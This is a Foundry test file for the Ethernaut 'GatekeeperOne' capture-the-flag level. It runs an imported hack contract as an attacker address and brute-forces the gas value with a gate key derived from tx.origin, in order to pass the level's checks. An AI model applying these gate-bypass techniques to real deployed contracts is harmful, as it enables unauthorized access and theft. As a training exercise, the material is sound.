// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {GatekeeperOneFactory} from "src/levels/GatekeeperOneFactory.sol";
import {GatekeeperOne} from "src/levels/GatekeeperOne.sol";
import {GatekeeperOneHack} from "src/hack/GatekeeperOneHack.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOneFactory private factory;
    GatekeeperOne private gatekeeperOne;
    address private attacker = makeAddr("attacker");

    function setUp() external {
        factory = new GatekeeperOneFactory();
        address gatekeeperOneAddress = factory.createInstance(attacker);
        gatekeeperOne = GatekeeperOne(gatekeeperOneAddress);
    }

    // Use --sender option with forge test.
    // startPrank is not working.
    function test_GatekeeperOneHack() external {
        // Fund attacker address with ether
        vm.deal(attacker, 1 ether);

        // Following this, for all the transactions, msg.sender will be the attacker
        vm.startPrank(attacker);

        GatekeeperOneHack gatekeeperHack = new GatekeeperOneHack();

        gatekeeperHack.hack(address(gatekeeperOne));

        bool success = factory.validateInstance(
            payable(address(gatekeeperOne)),
            attacker
        );

        assertTrue(gatekeeperOne.entrant() == attacker);
        assertTrue(success, "GatekeeperOneTest : Failed to pass the gates.");

        vm.stopPrank();
    }

    function test_BruteForceGas() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0x000000ff0000ffff;

        for (uint i; i < 8191; ++i) {
            try gatekeeperOne.enter{gas: i + (8191 * 10)}(gateKey) {
                console2.log("Required Gas : ", i + (8191 * 10));
                console2.log("Required Gas : ", i);
                return;
            } catch {}
        }

        revert("Hack Failed!!!");
    }
}
